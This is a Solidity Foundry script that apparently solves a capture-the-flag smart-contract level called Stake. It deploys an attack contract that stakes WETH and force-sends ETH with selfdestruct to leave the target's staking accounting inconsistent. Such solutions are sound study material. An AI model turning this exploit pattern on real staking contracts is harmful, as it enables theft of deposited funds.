
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "../src/Stake.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

/*
    Requirements

    The Stake contract's ETH balance has to be greater than 0.
    totalStaked must be greater than the Stake contract's ETH balance.
    You must be a staker.
    Your staked balance must be 0.

    Solution

    1. Stake eth from player
    2. Unstake eth from player
    3. Stake eth/weth from contract
    4. Force send eth from contract using selfdestruct
*/

contract StakeAttack {
    constructor(Stake stake) payable {
        IERC20 weth = IERC20(address(stake.WETH()));
        weth.approve(address(stake), 0.002 ether);

        stake.StakeWETH(0.002 ether);
        selfdestruct(payable(address(stake)));
    }
}

contract StakeSolution is Script {

    Stake stake = Stake(0xf8B75BB47357cac419AAeD36e1F6498f7c42f258);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address player = vm.envAddress("MY_ADDRESS");

        // From player stake 0.02 eth
        stake.StakeETH{value: 0.002 ether}();
        // Unstake 0.02 eth
        stake.Unstake(0.002 ether);

        // Stake weth from contract and force send ether
        new StakeAttack{value: 0.001 ether}(stake);

        vm.stopBroadcast();

        uint256 balance = address(stake).balance;
        require(balance > 0, "!Balance > 0");
        require(stake.totalStaked() > balance, "!totalStaked > balance");
        require(stake.Stakers(player) == true, "Stakers(player) != true");
        require(stake.UserStake(player) == 0, "UserStake(player) != 0");
    }
}